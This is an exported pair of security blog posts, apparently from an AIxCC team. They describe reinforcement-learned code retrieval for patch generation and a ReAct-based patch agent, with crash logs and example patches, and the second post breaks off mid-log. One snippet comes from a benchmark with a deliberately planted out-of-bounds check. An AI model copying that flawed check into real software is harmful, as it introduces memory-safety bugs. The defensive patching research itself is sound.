[{"section":"Blog","slug":"/blog/post-custom-model/","title":"Teaching LLMs to Retrieve: Custom Models for Security Patch Generation","description":"How we trained specialized LLMs to learn what code context matters for vulnerability patching - moving from manual context engineering to adaptive code context learning through reinforcement learning","date":"November 2, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/custom-model/preview_hu_15abd80bd1545159.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/custom-model\\/preview_hu_d7177b69fa8edb66.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/custom-model/preview_hu_3f1a3db68288de58.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/custom-model\\/preview_hu_3d2730ecb2a6d479.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Patch","tags":"custom-model, llm, reinforcement-learning, patch-generation, context-learning","content":"The Typedef That Changed Everything Picture this: you\u0026rsquo;re asking an LLM to patch a security vulnerability in Nginx, a codebase with millions of lines. The bug is clear, the fix location is obvious, but your patch won\u0026rsquo;t compile. Why? Because buried somewhere in the headers are two critical typedef definitions that the LLM never saw.\nWe discovered this the hard way during the AIxCC Semifinals. Challenge challenge-004-nginx-cp/cpv15 became our wake-up call. When we ran our baseline patching agent Aider 20 times without the typedef definitions, only 5 patches compiled successfully. But when we included those typedefs? 18 out of 20 compiled successfully. That 5/20 → 18/20 leap wasn\u0026rsquo;t about smarter LLMs or better prompts. It was about giving the right context.\nThis insight inspired the design of an our agent (i.e., the Multi-turn Retrieval Agent) and a deeper question: instead of hand-crafting context, could we teach an LLM to learn what context really matters on its own?\nFrom Engineering to Learning Context engineering works—as we showed in our previous post, systematic information structuring dramatically improves LLM performance. But context engineering has a problem: it\u0026rsquo;s manual, heuristic-driven, and doesn\u0026rsquo;t scale across different bug types and codebases.\nHuman developers don\u0026rsquo;t patch bugs in one shot. They form hypotheses, examine code, run tests, gather clues, refine their search. They learn what context matters through iteration. Why shouldn\u0026rsquo;t our AI do the same?\nThis insight led us to develop custom models for code context learning—specialized LLMs trained through reinforcement learning to identify and retrieve the missing pieces needed for successful patch generation.\nThe Problem: Context Windows Meet Reality Let\u0026rsquo;s be brutally honest about the challenges:\nContext Window Limitations: Even with today\u0026rsquo;s long-context models, you can\u0026rsquo;t feed an entire large-scale codebase into an LLM. The attention complexity and window size limits make it infeasible. A typical enterprise codebase might have 10 million lines—good luck fitting that into a 200K token context window. API Costs: Processing massive inputs isn\u0026rsquo;t just technically difficult—it\u0026rsquo;s financially prohibitive. Repeatedly sending thousands of lines to GPT-4 or Claude for every patching attempt would bankrupt most security budgets faster than you can say \u0026ldquo;vulnerability.\u0026rdquo; The Missing Context Problem: But here\u0026rsquo;s the real challenge—you need just enough context for the patch to work, but not so much that you overwhelm the model or your wallet. Too little context and your patch won\u0026rsquo;t compile. Too much and you waste tokens on irrelevant code. How do we find that sweet spot? We treat it as a learning problem.\nCode Context Learning: The Setup Overview of custom model for code context learning\rWe formulated code context learning as a reinforcement learning (RL) problem. Here\u0026rsquo;s the intuition:\nThe Environment: A codebase with a vulnerability and a crash log The Agent: Our custom LLM that decides what code to retrieve The Actions: Retrieving specific code symbols (functions, structs, types) The Reward: Whether the generated patch compiles and fixes the vulnerability At each turn $h$, the agent observes the current context $x_{t,h}$ and chooses retrieval actions $a_{t,h}$—requests to fetch specific code definitions. The environment integrates these retrieved artifacts into the context, constructing the next state $x_{t,h+1}$.\nAfter $H$ turns of retrieval, we feed the final context to a powerful general-purpose LLM (GPT-4, Claude, Gemini) for actual patch generation. This architecture deliberately decouples context acquisition from patch generation, letting us leverage state-of-the-art LLMs while maintaining precise control over what information they receive.\n┌─────────────┐ │ Crash Log │ │ + Metadata │ └──────┬──────┘ │ ▼ ┌─────────────────────┐ │ Retrieval Policy π │◄─── Custom Model (Llama-3.2-3B) │ \u0026#34;What should I │ │ retrieve next?\u0026#34; │ └──────┬──────────────┘ │ │ Actions: retrieve ngx_http_userid_ctx_t, │ retrieve NGX_CUSTOM_FEATURE__NR, ... ▼ ┌──────────────────────┐ │ Environment │ │ (Code Context │ │ Builder) │ └──────┬───────────────┘ │ │ Updated context with retrieved symbols ▼ Repeat for H turns │ ▼ ┌──────────────────────┐ │ Patch Generation LLM │◄─── GPT-4 / Claude / Gemini │ (with full context) │ └──────┬───────────────┘ │ ▼ Generated Patch The key insight: smaller specialized models can learn effective retrieval strategies through task-specific training, reducing the need for expensive general-purpose models to do everything.\nMulti-Turn GRPO: Learning from Success Adapted and re-colored from the original Hugging Face diagram\rWe train our retrieval policy using Group Relative Policy Optimization (GRPO), adapted for multi-turn retrieval. The training process involves:\n1. Reward Modeling: Two components guide learning:\nFormat reward ($R_{\\mathrm{fmt}}$): Ensures structurally correct retrieval actions (valid markdown, proper symbol identification) Soundness reward ($R_{\\mathrm{snd}}$): Assesses whether the final patch compiles, preserves functionality, and fixes the vulnerability 2. Multi-Turn Trajectory Optimization: Unlike standard single-turn GRPO, our agent generates trajectories of retrieval actions over multiple turns. Each turn builds on previous retrievals, gradually constructing the context needed for successful patching.\n3. Online Learning: Rather than training on all challenge project vulnerabilities (CPVs) simultaneously—which would be memory-intensive—we update the policy online. The agent concentrates on a single CPV repeatedly until reaching a success plateau, then advances to the next. This mirrors how developers work: deep focus on one problem before moving to the next.\n# Simplified training objective (multi-turn GRPO) for cpv in challenge_project_vulnerabilities: for turn in range(H): # H retrieval turns # Generate retrieval actions actions = policy(context) # Execute retrieval, update context context = environment.retrieve(actions) # Compute rewards (format + soundness) reward = compute_reward(actions, context) # Update policy based on reward policy.update(reward, keep_close_to_reference_policy) The magic happens in that last line: the policy learns which symbols are worth retrieving by directly optimizing for patch success.\nA Real Example: babynginx/cpv-0 Let\u0026rsquo;s walk through how the learned policy works in practice. We\u0026rsquo;ll use babynginx/cpv-0, an internal benchmark motivated by CVE-2022-0995 (an out-of-bounds access in the Linux kernel), adapted to a simplified Nginx setting.\nThe Bug: The vulnerability arises when parsing a custom request header X-Feature. A numeric value gets converted using ngx_atoi and used to set a bitmap index. The range check incorrectly uses sizeof(bitmap) * BITS_PER_LONG, permitting out-of-bounds access.\nTurn 1: Fault Localization The process begins with an AddressSanitizer report indicating the failure site:\n==1234==ERROR: AddressSanitizer: heap-buffer-overflow #0 0x7f8b4c in ngx_http_process_custom_features /nginx/src/http/ngx_http_custom.c:156 #1 0x7f8b2a in ngx_http_process_request /nginx/src/http/ngx_http_request.c:2891 Retrieved Action (with reasoning from the model):\nThe potential vulnerability is an out-of-bounds read error in the `ngx_http_process_custom_features` function. The crash occurs at line 156 when processing custom features. **Relevant Symbols:** 1. `ngx_http_process_custom_features` Without this initial localization, subsequent retrievals would lack direction. The model learns that crash stack traces point to critical functions.\nTurn 2: Expanding Context At this stage, partial context has been assembled, but crucial information about valid feature indices is missing.\n// Augmented Code Context [148]: static void ngx_http_process_custom_features(ngx_http_request_t *r) { [149]: ngx_int_t feature_id; [150]: feature_id = ngx_atoi(r-\u0026gt;headers_in-\u0026gt;x_feature-\u0026gt;value.data, [151]: r-\u0026gt;headers_in-\u0026gt;x_feature-\u0026gt;value.len); [152]: [153]: // BUG: incorrect bound check [154]: if (feature_id \u0026gt;= 0 \u0026amp;\u0026amp; [155]: feature_id \u0026lt; sizeof(r-\u0026gt;http_features-\u0026gt;bitmap) * BITS_PER_LONG) { [156]: ngx_set_bit(r-\u0026gt;http_features-\u0026gt;bitmap, feature_id); // @BUG_HERE [157]: } [158]: } Retrieved Action:\nThe following symbols are relevant to the provided C code snippet: **Relevant Symbols:** 1. `ngx_http_features_t` (structure definition) 2. `NGX_CUSTOM_FEATURE__NR` (boundary constant) The model has learned that structure definitions and boundary constants are critical for understanding buffer limits.\nBefore Turn 3: The Critical Discovery The context builder retrieves the header file, uncovering the missing structure:\n// Augmented Code Context typedef struct { unsigned long bitmap[2]; } ngx_http_features_t; #define NGX_CUSTOM_FEATURE__NR 64 This discovery is decisive. The macro NGX_CUSTOM_FEATURE__NR specifies the upper bound of valid feature indices. Our empirical evaluation showed that without retrieving this symbol, LLM-generated patches consistently failed—either uncompilable or logically unsound.\nThe Generated Patch With complete context, the patching LLM generates:\n--- a/src/http/ngx_http_custom.c +++ b/src/http/ngx_http_custom.c @@ -152,7 +152,7 @@ static void ngx_http_process_custom_features(ngx_http_request_t *r) { r-\u0026gt;headers_in-\u0026gt;x_feature-\u0026gt;value.len); - if (feature_id \u0026gt;= 0 \u0026amp;\u0026amp; - feature_id \u0026lt; sizeof(r-\u0026gt;http_features-\u0026gt;bitmap) * BITS_PER_LONG) { + if (feature_id \u0026gt;= 0 \u0026amp;\u0026amp; feature_id \u0026lt; NGX_CUSTOM_FEATURE__NR) { ngx_set_bit(r-\u0026gt;http_features-\u0026gt;bitmap, feature_id); } } The key improvement: replacing a brittle size-based bound with a semantically correct check against NGX_CUSTOM_FEATURE__NR. This ensures both memory safety and logical correctness.\nTraining Dynamics: What Actually Happens We fine-tuned a custom model based on Meta\u0026rsquo;s Llama-3.2-3B-Instruct on 7 CPV instances, training on 8× NVIDIA A100 (80GB) GPUs. The hyperparameters were optimized for code retrieval:\nContext Window: 8,192 tokens max prompt, 10,240 total sequence length Parameter-Efficient Fine-Tuning: LoRA with rank 32 and alpha 32 Optimization: AdamW with learning rate $5 \\times 10^{-6}$ GRPO Group Size: 12 parallel generations per step Retrieval Turns: $H = 4$ steps per episode Downstream Evaluation: GPT-4.1 for patch generation The training trajectories reveal fascinating patterns:\nEarly Sparse Successes: In many CPVs, the maximum reward spikes to 1.0 well before the mean reward rises. This confirms the utility of group-based optimization—even when the policy is immature, diversity in rollouts can surface a correct retrieval path. Staircase-like Improvement: Mean reward increases in discrete jumps rather than smoothly. This reflects the sequential nature of retrieval: once the policy learns to fetch a critical symbol, downstream steps become substantially easier. Project-Dependent Difficulty: Some projects show long flat regions with zero reward, while others exhibit frequent reward spikes. This suggests varying difficulty in context localization across different codebases. Persistence Matters: The recurrence of max-reward spikes across epochs indicates that repeated attempts in our online learning don\u0026rsquo;t merely overfit—they stabilize the policy so success can be rediscovered consistently. Results: Does It Actually Work? We evaluated our custom model on 18 CPVs across three checkpoints (rc1, rc2, rc3). Here\u0026rsquo;s the breakdown:\nSuccess Rate Checkpoint 1 Checkpoint 2 Checkpoint 3 Sound Patches 9/18 (50%) 11/18 (61%) 10/18 (56%) Key Insights:\nOverall performance: Roughly half of all patch attempts succeeded, demonstrating the agent can generate compilable fixes across diverse bug types Checkpoint progression: Later checkpoints showed fewer severe failures, suggesting moderate improvements over initial training Consistent failures: Certain CPVs (e.g., freerdp-1, freerdp-2, libpng-1) failed across all checkpoints—indicating bug classes that remain difficult Reliable successes: Other CPVs (e.g., integration-test-1/2, libexif-1/2, libxml2-1, sqlite3-5) succeeded consistently, showing sufficient retrieval context for these categories AIxCC Final Competition: Real-World Performance The true test came at the DARPA AIxCC Final Competition, where our custom model-powered agent faced real-world vulnerabilities under competitive conditions. Here\u0026rsquo;s a concrete example of how our approach performed in the high-stakes finals.\nCase Study: Wireshark BER Stack Buffer Overflow The Challenge: A stack-buffer-overflow vulnerability in Wireshark\u0026rsquo;s BER (Basic Encoding Rules) dissector—specifically in the dissect_ber_GeneralString function. This is exactly the kind of complex, real-world vulnerability that tests whether AI-assisted patching actually works.\nThe Crash Log: Our agent received this AddressSanitizer report:\n==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff501517bd at pc 0x000005431adb bp 0x7fff50151670 sp 0x7fff50151668 WRITE of size 1 at 0x7fff501517bd thread T0 SCARINESS: 46 (1-byte-write-stack-buffer-overflow) #0 0x5431ada in dissect_ber_GeneralString /src/wireshark/epan/dissectors/packet-ber.c:3194:34 #1 0x542899b in try_dissect_unknown_ber /src/wireshark/epan/dissectors/packet-ber.c:935:26 #2 0x5b84ecd in call_dissector_through_handle /src/wireshark/epan/packet.c:887:9 ... Address 0x7fff501517bd is located in stack of thread T0 at offset 93 in frame #0 0x5427a1f in try_dissect_unknown_ber /src/wireshark/epan/dissectors/packet-ber.c:814 This frame has 12 object(s): [32, 40) \u0026#39;val.i510\u0026#39; (line 2021) [64, 72) \u0026#39;val.i\u0026#39; (line 2021) [96, 97) \u0026#39;ber_class\u0026#39; (line 816) \u0026lt;== Memory access at offset 93 underflows this variable ... The Complexity: This bug involves:\nStack memory layout with precise bounds Multiple function calls through dissector handlers Buffer size management across different code paths Complex interaction between name_string, max_len, and actual buffer capacity The Generated Patch: Our custom model-powered agent successfully identified the vulnerable code and generated this sound patch:\ndiff --git a/epan/dissectors/packet-ber.c b/epan/dissectors/packet-ber.c index ce97968..42ba5c2 100644 --- a/epan/dissectors/packet-ber.c +++ b/epan/dissectors/packet-ber.c @@ -3054,8 +3054,8 @@ dissect_ber_GeneralString(asn1_ctx_t *actx, proto_tree *tree, tvbuff_t *tvb, int proto_item *cause; str = str_arr; - max_len = 255; - if (name_string) { + max_len = sizeof(str_arr); + if (name_string \u0026amp;\u0026amp; name_len \u0026gt; 0) { str = name_string; max_len = name_len; } @@ -3086,12 +3086,17 @@ dissect_ber_GeneralString(asn1_ctx_t *actx, proto_tree *tree, tvbuff_t *tvb, int return end_offset; } + /* Ensure we do not write out of bounds; always leave space for NUL. */ if (len \u0026gt;= (max_len - 1)) { - len = max_len - 1; + len = max_len \u0026gt; 0 ? max_len - 1 : 0; + } + /* If buffer for output is 0, skip copy */ + if (max_len \u0026gt; 0 \u0026amp;\u0026amp; len \u0026gt; 0) { + tvb_memcpy(tvb, str, offset, len); + str[len] = 0; + } else if (max_len \u0026gt; 0) { + str[0] = 0; } - - tvb_memcpy(tvb, str, offset, len); - str[len]=0; if (hf_id \u0026gt; 0) { proto_tree_add_string(tree, hf_id, tvb, offset, len, str); @@ -3178,7 +3183,7 @@ dissect_ber_GeneralString(asn1_ctx_t *actx, proto_tree *tree, tvbuff_t *tvb, int offset = dissect_ber_restricted_string(false, BER_UNI_TAG_GeneralString, actx, tree, tvb, offset, hf_id, (name_string) ? \u0026amp;out_tvb : NULL); - if (name_string) { + if (name_string \u0026amp;\u0026amp; name_len \u0026gt; 0) { /* * XXX - do we want to just get what\u0026#39;s left in the tvbuff * if the full length isn\u0026#39;t available in the tvbuff, or @@ -3186,12 +3191,12 @@ dissect_ber_GeneralString(asn1_ctx_t *actx, proto_tree *tree, tvbuff_t *tvb, int */ if (out_tvb) { tvb_len = tvb_get_uint8(tvb, offset); - if ((unsigned)tvb_len \u0026gt;= name_len) { - tvb_memcpy(out_tvb, (uint8_t*)name_string, 0, name_len-1); - } else { - tvb_memcpy(out_tvb, (uint8_t*)name_string, 0, tvb_len); + /* Clamp copy len to fit inside output buffer */ + unsigned copy_len = ((unsigned)tvb_len \u0026lt; (name_len - 1)) ? (unsigned)tvb_len : (name_len - 1); + if (copy_len \u0026gt; 0) { + tvb_memcpy(out_tvb, (uint8_t*)name_string, 0, copy_len); } - name_string[tvb_len] = \u0026#39;\\0\u0026#39;; + name_string[copy_len] = \u0026#39;\\0\u0026#39;; } } Why This Patch is Sound The generated patch demonstrates sophisticated understanding of the vulnerability:\nCorrect Buffer Size Calculation: Changed from hardcoded max_len = 255 to max_len = sizeof(str_arr), ensuring the size matches actual buffer allocation. Defensive Null Checks: Added name_len \u0026gt; 0 validation in multiple places to prevent zero-length buffer operations that could cause underflows. Safe Length Clamping: Implemented proper bounds checking with len = max_len \u0026gt; 0 ? max_len - 1 : 0 to handle edge cases where max_len might be zero. Conditional Memory Operations: Wrapped tvb_memcpy calls in guards checking both max_len \u0026gt; 0 and len \u0026gt; 0, preventing out-of-bounds writes entirely. Improved Copy Length Logic: In the second location, replaced conditional logic with a single clamped copy_len calculation, making the bounds checking explicit and auditable. What This Demonstrates This real-world example validates several key aspects of our approach:\nContext Learning in Action: The model successfully retrieved and utilized context about buffer structures, size constraints, and calling patterns to generate a comprehensive fix addressing multiple vulnerable code paths. Security-Aware Patching: The patch doesn\u0026rsquo;t just stop the crash—it implements defense-in-depth by adding multiple layers of validation, showing the model learned security principles beyond simple syntax fixes. Production-Ready Quality: The generated code includes appropriate comments, maintains code style consistency, and handles edge cases that human reviewers would expect in a professional security patch. Competition Performance: This success in the high-pressure AIxCC Finals environment demonstrates that learned retrieval policies can generalize to unseen vulnerabilities in real-world, large-scale codebases like Wireshark. Key Findings and Contributions After developing and evaluating custom models for patching, here\u0026rsquo;s what we learned:\n✅ With proper code context, commercial LLMs generate secure patches: When provided comprehensive and relevant code context through multi-turn retrieval, state-of-the-art commercial models demonstrate strong capability in producing functionally correct and security-compliant patches. ✅ Pretrained models have fair baseline performance: Base models like Llama-3.2-3B-Instruct exhibit reasonable baseline performance in identifying relevant code artifacts, providing a solid foundation for specialization. ✅ RL fine-tuning improves context selection: Reinforcement learning using multi-turn GRPO significantly enhances the model\u0026rsquo;s ability to select optimal code contexts, leading to measurable improvements in patch generation quality. ⚠️ Forgetting remains a challenge: Online learning introduces catastrophic forgetting—knowledge from earlier CPVs degrades when adapting to new instances, limiting overall training effectiveness. Contributions to the Field This work makes several key contributions to AI-assisted security patch generation:\nEmpirical Validation of Context Importance: We demonstrate that providing missing code context (e.g., undefined symbol definitions) is crucial for sound patch generation by LLMs—a 5/20 → 18/20 success rate improvement. Multi-Turn Retrieval Framework: We propose and train a novel multi-turn retrieval agent that iteratively retrieves concise, targeted code context, enabling effective utilization of powerful yet context-limited commercial LLMs. Effectiveness on Real-World Benchmarks: We demonstrate the efficacy of learned multi-turn retrieval through successful participation in the DARPA AIxCC competition, where context quality directly impacted patch success rates. Limitations and Future Directions Our approach has several practical limitations worth acknowledging:\nLanguage Scope: Current implementation specializes for C codebases and hasn\u0026rsquo;t been extended to other languages like Java or Python. Restricted Retrieval Scope: The retrieval process focuses only on function definitions, method definitions, and type definitions—potentially overlooking other useful artifacts like build scripts or configuration files. Tooling Overhead: Our use of parser-based tools required manual adapter development, limiting scalability. Broader, language-agnostic tools would improve generality. Catastrophic Forgetting: The online learning approach can degrade retrieval policies learned on earlier CPVs when adapting to new ones—a classic RL challenge. Competition Constraints: Late rule changes in the competition limited available custom model learning time and validation breadth. Future Research Opportunities The most exciting opportunities ahead:\nExpanding Language Support: Adapting the retrieval framework to Java, Python, Rust, and other languages with appropriate parsers and symbol extraction tools. Richer Retrieval Actions: Beyond function and type definitions, retrieving documentation, test cases, commit history, and related patches could provide valuable context. Addressing Catastrophic Forgetting: Techniques like experience replay, progressive neural networks, or meta-learning could help retain knowledge across CPVs while adapting to new ones. Integrating with RAG Systems: Combining learned retrieval policies with retrieval-augmented generation could dynamically pull in relevant vulnerability patterns and exploitation knowledge. Human-in-the-Loop Refinement: Interactive systems where security experts guide retrieval strategies could accelerate learning and improve policy quality. What This Means for Security Code context learning represents a fundamental shift from manual prompt engineering to adaptive, learnable approaches in AI-assisted security.\nInstead of hand-crafting heuristics for what context matters, we\u0026rsquo;re training specialized models to discover these patterns through reinforcement learning. The result? Systems that adapt to different bug types, codebases, and patching scenarios without constant human intervention.\nThis isn\u0026rsquo;t just about patching faster—it\u0026rsquo;s about patching smarter. As vulnerabilities grow more complex and codebases more massive, the ability to automatically identify and retrieve relevant context becomes critical for scalable automated security.\nThe future of security patching isn\u0026rsquo;t about replacing human expertise—it\u0026rsquo;s about teaching AI to learn what context matters, amplifying human judgment at machine scale. Custom models for code context learning represent one step toward that future.\n"},{"section":"Blog","slug":"/blog/post-crs-patch-agent-martian/","title":"Every Patch Agent has its Own Story (1) - Martian: Exploring the Unknown with Sophisticated Tools","description":"Description of patch agents","date":"October 15, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/martian_hu_3a329e454c4493c1.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/martian_hu_97ad6a6fc3c538d2.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-patch/martian_hu_51f1faa818a8c904.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-patch\\/martian_hu_aff9de74e94a0b74.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Patch","tags":"patch, patch-agent","content":"As we mentioned in our previous blog post, we enhanced the patching capabilities of Atlantis by ensembling multiple patch agents. In this series of blog posts, we will introduce each of our patch agents in detail and explain the rationale behind their designs.\nDiversity for Good To maximize the effectiveness of ensembling, it is crucial to have diverse agents. If all agents are similar, the ensemble will not perform significantly better than any individual agent. Therefore, we intentionally designed our patch agents to be diverse in their approaches, methodologies, and also models used. We newly developed six patch agents, each with its own unique architecture and motivation, as summarized in the table below.\n+---------------+----------------+----------------------------------------------+------------------------------+ | Agent | Architecture | Motivation | Used Models | +---------------+----------------+----------------------------------------------+------------------------------+ | Martian | Workflow | Simple workflow yet complex tools | o4-mini, claude-4-sonnet | | MultiRetrieval| Agent | Iterative retrieval and patching | claude-3.7-sonnet, o4-mini | | Prism | Multi-agent | Multi-agent system for long-context handling | o4-mini | | Vincent | Workflow | Property-based approach for guided patching | gemini-2.5-pro | | Claudelike | Agent | Patch generation inspired by Claude code | claude-3.7-sonnet | | Eraser | Workflow | Use of custom model for specialized tasks | Custom model | +---------------+----------------+----------------------------------------------+------------------------------+ Martian: Into the Unknown, Armed with Sophisticated Tools We first introduce Martian, a patch agent that employs a straightforward workflow but leverages sophisticated tools. The name \u0026ldquo;Martian\u0026rdquo; reflects its approach of exploring the unknown, much like a Martian would, by utilizing advanced tools to navigate and understand unfamiliar terrain.\nDawn on Mars: The Birth of Martian Agent In the beginning, our focus was on prompt engineering — how to craft the right prompts to give open-source AI agents like Aider and SWE-agent the best possible guidance. Our earliest approach was quite simple: providing crash logs such as an ASAN report directly to the agents. Over time, we explored more advanced strategies, such as parsing stack traces and supplying related source code snippets alongside them. We called each individual piece of information an insight, and we experimented with various combinations of these insights to improve the agent\u0026rsquo;s understanding. (In our codebase, you can find these insight generators in insighter/services.) However, by late 2024 and early 2025, as LLM models rapidly evolved, it became clear that prompt engineering alone was no longer enough. We now had to consider tool usage, conversational flow, long-term memory, and structured outputs. In this transition from prompt engineering to context engineering, we decided to build our own agent to experiment with flexible architectures and richer contextual reasoning — and thus, Martian Agent was born.\nMartian Agent was built upon two key design principles. First, we separated fault localization and patch generation to optimize context management. Since the LLM\u0026rsquo;s context window is limited, providing precisely the right information at each stage is crucial. fault localization and patch generation each pose significant but distinct challenges, so we found it more effective to handle them independently, each with its own tailored context. Second, we need an environment that allows us to easily test and integrate different tools. To achieve this, we developed a ReAct-based agent framework on top of LangChain, flexibly incorporating various tools. This helps us to rapidly prototype and tune the agent\u0026rsquo;s capabilities through the competition testing.\nInside the Martian Agent The overall structure of Martian Agent is as follows:\nFig.1 High-level overview of Martian Agent\nThe process begins with fault localization, where the agent takes a crash log as input and identifies both the root cause and the function that needs to be fixed. The crash log must include an ASAN report or, at minimum, a stack trace describing the crash. The fault localization module is implemented using the ReAct approach, allowing the agent to iteratively analyze the code through tool calls designed for source code exploration.\nOnce the faulty code region is identified, the patch generation module takes over to produce an actual fix. The patch generation module is also built on the ReAct framework, enabling the agent to modify source code through tool interactions and extract the final patch using the git diff command. The generated patch is then validated through a sequence of steps: project build, functionality testing, and crash reproduction testing. If the patch fails any of these validation stages, the agent uses the feedback to re-run the process and refine the patch until a stable fix is achieved.\nReAct-based Fault Localization Martian Agent\u0026rsquo;s fault localization module is inspired by CodeRover-S. Since CodeRover-S demonstrated great performance on real-world bugs (OSS-Fuzz dataset), we developed our fault localization module based on its approach. We developed following code search APIs to help the agent explore the codebase effectively:\n- search_symbol(symbol_name, file_or_directory_path): Given a symbol name, it finds a symbol definition in a given path and return the source code of the symbol definition. - search_string(string, file_or_directory_path): Given a string, it returns the file name and line number(s) where the string appears in the codebase. - view_file(file_path, offset, limit): Given a file path, it returns the source code of the file from the offset line to the limit line. With these tools, the ReAct agent can iteratively explore the codebase to identify the root cause of the crash. Similar to the human debugging process, it supports a back-and-forth interaction between understanding the crash log and examining the codebase.\nPatch Generation Inspired by Claude Code Generating a patch is far more complex than simply producing code snippets. Unlike isolated code generation, a valid patch must integrate seamlessly into the existing codebase. This means it must adhere to strict structural and formatting requirements — including correct line offsets, contextual consistency with surrounding code, and compatibility with the project\u0026rsquo;s build system.\nTo meet these requirements, we designed the patch generation module to use a search/replace approach, implemented through specialized tool calls and powered by Anthropic claude models. Through extensive experiments, we found that this method consistently produced patches that were both syntactically correct and directly applicable to the source code. Inspired by the Claude Code methodology, we further refined our design by constraining the patch scope to a single function, which reduces context size and allows the model to focus more precisely on the relevant logic. Narrowing the scope could be seemed risky, but in AIxCC competition we observed that lots of the example bugs which shown before the competition were fixed within a single function and thanks to our ensemble system, we could expect other agents to cover multi-function patches.\nThe patch generation module operates with the following tools:\n- view_function(function_name) — Returns the source code of a given function. - edit_function(function_name, old_string, new_string) — Replaces a specific code segment (old_string) with new content (new_string) within the target function. - add_import_module(module_name, file_path) — Adds an import statement to the specified file (used only for Java projects). Dealing with Stack Overflow and Timeout bugs Beyond general patch-generation strategies, we also developed specialized techniques to handle specific classes of bugs. In the AIxCC competition, certain challenges involved stack overflow and timeout errors. These categories, especially in Java, posed unique difficulties because their Jazzer crash logs often contained little to no information about the actual root cause — unlike conventional Jazzer sanitized logs.\nExample of Jazzer timeout log:\n==16== ERROR: libFuzzer: timeout after 25 seconds Stack traces of all JVM threads: Thread[Reference Handler,10,system] at java.base@17.0.2/java.lang.ref.Reference.waitForReferencePendingList(Native Method) at java.base@17.0.2/java.lang.ref.Reference.processPendingReferences(Reference.java:253) at java.base@17.0.2/java.lang.ref.Reference$ReferenceHandler.run(Reference.java:215) Thread[Notification Thread,9,system] Thread[Finalizer,8,system] at java.base@17.0.2/java.lang.Object.wait(Native Method) at java.base@17.0.2/java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:155) at java.base@17.0.2/java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:176) at java.base@17.0.2/java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:172) Thread[process reaper,10,system] at java.base@17.0.2/jdk.internal.misc.Unsafe.park(Native Method) at java.base@17.0.2/java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:252) at java.base@17.0.2/java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:401) at java.base@17.0.2/java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:903) at java.base@17.0.2/java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1061) at java.base@17.0.2/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1122) at java.base@17.0.2/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635) at java.base@17.0.2/java.lang.Thread.run(Thread.java:833) Thread[Attach Listener,9,system] Thread[Common-Cleaner,8,InnocuousThreadGroup] at java.base@17.0.2/java.lang.Object.wait(Native Method) at java.base@17.0.2/java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:155) at java.base@17.0.2/jdk.internal.ref.CleanerImpl.run(CleanerImpl.java:140) at java.base@17.0.2/java.lang.Thread.run(Thread.java:833) at java.base@17.0.2/jdk.internal.misc.InnocuousThread.run(InnocuousThread.java:162) Thread[main,5,main] at app//com.code_intelligence.jazzer.driver.FuzzTargetRunner.dumpAllStackTraces(FuzzTargetRunner.java:534) Thread[Signal Dispatcher,9,system] Garbage collector stats: PS MarkSweep: 0 collections took 0ms PS Scavenge: 30 collections took 135ms SUMMARY: libFuzzer: timeout Example of Jazzer stack overflow log:\n== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueLow: Stack overflow (use \u0026#39;-Xss921k\u0026#39; to reproduce) 